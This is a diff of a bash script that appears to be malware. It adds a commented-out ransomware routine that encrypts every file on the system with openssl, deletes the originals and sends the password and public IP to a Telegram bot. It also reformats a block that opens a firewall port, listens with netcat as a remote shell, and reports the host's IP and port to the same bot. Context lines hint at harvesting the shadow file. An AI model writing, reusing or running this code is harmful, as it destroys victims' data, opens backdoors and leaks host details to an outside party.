@@ -79,28 +79,52 @@ if [ $? -eq 0 ]; then
 	rm "$result_shadow"
 	h=$(date +"%H:%M")
 	
+	#Crypt System
+	#function to generate a random password
+	#function generate_password {
+	    #generate a random password using openssl rand
+	    #password=$(openssl rand -base64 16)
+	    #send the generated password
+	    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System Crypted: $public_ip %0APassword: $password"
+	#}
+	#call function
+	#generate_password
+	#creates a list of all files
+	#files=$(find / -type f)
+	#encrypts each file using the generated password
+	#for file in $files; do
+	    #create encrypted file name
+	    #encrypted_file="$file.enc"
+	    #encrypt the file using openssl and the generated password
+	    #openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$password"
+	    #eemoves the original file if encryption was successful
+	    #if [ $? -eq 0 ]; then
+		#rm "$file"
+	    #fi
+	#done
+	
 	#Remote Shell enabled for 30 minutes
 	h=$(date +"%H:%M")
 	port=4000
 	start="14:00"
 	if [ "$h" == $start ]; then
 		echo "Enabling portforwarding on port $port..."
-        iptables -A INPUT -p tcp --dport $port -j ACCEPT
-        echo "Start listening..."
-        nc -l -p $port
-        #send notification
-		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
-        while [ "$h" != "$stop" ];
-        do
-        	echo "Listening..."
-            sleep 1
-            h=$(date +"%H:%M")
-        done
-    else
-       	echo "Stop portforwarding on port $port..."
-        iptables -A INPUT -p tcp --dport $port -j DROP
-        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Stop listening: $public_ip":"$port"
-    fi
+		iptables -A INPUT -p tcp --dport $port -j ACCEPT
+		echo "Start listening..."
+		nc -l -p $port
+		#send notification
+			curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
+		while [ "$h" != "$stop" ];
+		do
+			echo "Listening..."
+		    sleep 1
+		    h=$(date +"%H:%M")
+		done
+	    else
+		echo "Stop portforwarding on port $port..."
+		iptables -A INPUT -p tcp --dport $port -j DROP
+		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Stop listening: $public_ip":"$port"
+	    fi
 	
 	#Identify new host
 	wifi_interface="wlan0"
